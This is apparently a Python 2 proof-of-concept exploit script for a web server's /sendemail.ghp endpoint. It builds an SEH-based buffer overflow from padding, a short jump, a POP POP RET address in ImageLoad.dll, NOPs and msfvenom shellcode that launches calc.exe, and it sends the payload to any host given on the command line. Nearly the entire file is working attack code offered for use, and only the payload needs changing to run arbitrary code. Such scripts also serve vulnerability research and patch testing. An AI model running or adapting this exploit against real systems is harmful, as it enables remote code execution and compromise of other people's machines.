# Author: hodorsec
# Found via fuzzing parameters via Boofuzz
#!/usr/bin/env python
import sys, socket, struct, time, ssl
 
if len(sys.argv) != 4:
    print "Usage: " + sys.argv[0] + " <host> <port> <http/https>\n"
    print "Example: " + sys.argv[0] + " 192.168.1.1 80 http"
    print "Example: " + sys.argv[0] + " 192.168.1.1 443 https\n"
    exit()

host = sys.argv[1]    
port = int(sys.argv[2])
method = sys.argv[3]

if method == "http":
    print "Trying to connect via HTTP..."
elif method == "https":
    print "Trying to connect via SSL..."
else:
    print "\nInvalid method given: enter http or https\n"
    exit()

# Shellcode
# msfvenom -p windows/exec cmd=calc.exe -v shellcode -f python -b "\x0a\x0d\x00\x25\x26\x27\x2b" exitfunc=thread
# Payload size: 220 bytes
shellcode =  ""
shellcode += "\xd9\xee\xba\x75\x93\x59\xb5\xd9\x74\x24\xf4\x5b"
shellcode += "\x29\xc9\xb1\x31\x31\x53\x18\x83\xc3\x04\x03\x53"
shellcode += "\x61\x71\xac\x49\x61\xf7\x4f\xb2\x71\x98\xc6\x57"
shellcode += "\x40\x98\xbd\x1c\xf2\x28\xb5\x71\xfe\xc3\x9b\x61"
shellcode += "\x75\xa1\x33\x85\x3e\x0c\x62\xa8\xbf\x3d\x56\xab"
shellcode += "\x43\x3c\x8b\x0b\x7a\x8f\xde\x4a\xbb\xf2\x13\x1e"
shellcode += "\x14\x78\x81\x8f\x11\x34\x1a\x3b\x69\xd8\x1a\xd8"
shellcode += "\x39\xdb\x0b\x4f\x32\x82\x8b\x71\x97\xbe\x85\x69"
shellcode += "\xf4\xfb\x5c\x01\xce\x70\x5f\xc3\x1f\x78\xcc\x2a"
shellcode += "\x90\x8b\x0c\x6a\x16\x74\x7b\x82\x65\x09\x7c\x51"
shellcode += "\x14\xd5\x09\x42\xbe\x9e\xaa\xae\x3f\x72\x2c\x24"
shellcode += "\x33\x3f\x3a\x62\x57\xbe\xef\x18\x63\x4b\x0e\xcf"
shellcode += "\xe2\x0f\x35\xcb\xaf\xd4\x54\x4a\x15\xba\x69\x8c"
shellcode += "\xf6\x63\xcc\xc6\x1a\x77\x7d\x85\x70\x86\xf3\xb3"
shellcode += "\x36\x88\x0b\xbc\x66\xe1\x3a\x37\xe9\x76\xc3\x92"
shellcode += "\x4e\x98\x21\x37\xba\x31\xfc\xd2\x07\x5c\xff\x08"
shellcode += "\x4b\x59\x7c\xb9\x33\x9e\x9c\xc8\x36\xda\x1a\x20"
shellcode += "\x4a\x73\xcf\x46\xf9\x74\xda\x24\x9c\xe6\x86\x84"
shellcode += "\x3b\x8f\x2d\xd9"

# Badchars
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22"
"\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"
"\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"
"\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2"
"\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2"
"\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

# Maximum length
maxlength = 60000

# NOP's
nop = "\x90" * 32

# Crashes
crash_eip = 4064
crash_nseh = 4060
crash_seh = crash_nseh + 4

# Set variables to construct payload
prefix = "A" * 32                                                                   # Some padding
prefix += struct.pack("<L", 0x10010103) * ((crash_nseh - len(prefix)) / 4)          # RET NOP's
nseh = struct.pack("<L", 0x06eb9090)                                                # NOP # NOP # JMP SHORT 0x6
seh = struct.pack("<L", 0x10012af7)                                                 # POP POP RET # ImageLoad.dll
suffix = "\x90" * 32                                                                # Padding NOP's
suffix += shellcode                                                                 # Shellcode
suffix += "\x90" * (maxlength - len(prefix + nseh + seh + suffix))                  # Fill it

# Craft payload
payload = prefix + nseh + seh + suffix

print "[+] Connecting to " + host + "\n"

try:
        print "[+] Fuzzing with " + str(len(payload)) + " length message..."

    
        req = (
            "POST /sendemail.ghp HTTP/1.1\r\n"
            "Host: " + host + ":" + str(port) + "\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n"
            "Accept-Encoding: gzip, deflate\r\n"
            "Accept-Language: en-US\r\n"
            "Cookie: frmUserName=; frmUserPass=; UserID=1234; PassWD=1234; SESSIONID=1234\r\n"
            "Connection: close\r\n\r\n\r\n"
            "Email=" + payload + "&getPassword=Get+Password\r\n\r\n"
        )
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if method == "https":
            context = ssl._create_unverified_context()
            s = context.wrap_socket(s, server_hostname=host)
        s.settimeout(2)
        s.connect((host, port))
        s.send(req)
        s.close()

        time.sleep(0.5)
    
except Exception,e:
        print "[!] Error occured: " + str(e)
        print "[*] Crashed occured at buffer length: " + str(len(payload))
        sys.exit()


